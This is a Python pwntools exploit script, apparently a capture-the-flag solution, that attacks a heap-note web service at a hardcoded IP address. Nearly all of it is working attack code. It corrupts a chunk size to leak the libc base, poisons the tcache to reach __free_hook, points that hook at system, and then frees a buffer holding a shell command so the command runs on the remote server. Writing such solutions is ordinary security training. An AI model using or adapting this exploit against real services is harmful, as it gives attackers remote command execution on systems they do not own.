
import json
import requests

from base64 import*
from pwn import*

Url = 'http://202.198.27.90:28032/'

libc = ELF('./libc-2.31.so')

def add(idx,payload):
    data = p32(idx) + payload
    res = json.loads(requests.post(url=Url + 'add',data=data).text)
    print(res)

def show(idx):
    data = p32(idx)
    text  = requests.post(url=Url + 'show',data=data).text
    res = json.loads(text)
    return res

def edit(idx,payload):
    data = p32(idx) + payload
    text  = requests.post(url=Url + 'edit',data=data).text
    res = json.loads(text)
    return res

def free(idx):
    data = p32(idx)
    text  = requests.post(url=Url + 'delete',data=data).text
    res = json.loads(text)
    return res

#leak libc
add(0,b'a' * 0x20)
add(1,b'a' * 0x20)

add(2,b'a' * 0x100)
add(3,b'a' * 0x100)
add(4,b'a' * 0x100)
add(5,b'a' * 0x100)
add(6,b'a' * 0x100)
#modify next chunk size.
payload = b'a' * 0x20 + p64(0) + p64(0x441)
edit(1,payload)
#-->unsorted bin
free(2)
###
payload = b'a' * 0x30
edit(1,payload)
libc_base = u64(b64decode(show(1)['content'])[0x30:].ljust(8,b'\x00')) - 0x1ecbe0
log.success('libc_base:' + hex(libc_base))
payload = b'a' * 0x20 + p64(0) + p64(0x441)
edit(1,payload)

#tcache bin attack
add(7,b'a' * 0x20)
free(7)
free(1)

payload = b'a' * 0x20
payload += p64(0) + p64(0x31)
payload += p64(libc_base + libc.symbols['__free_hook'])

edit(0,payload)
add(8,b'a' * 0x20)
#__free_hook -> system
add(9,p64(libc_base + libc.symbols['system']).ljust(0x20,b'\x00'))

# #get flagi
add(10,b'cat /flag >/root/test\x00\x00')

free(10)
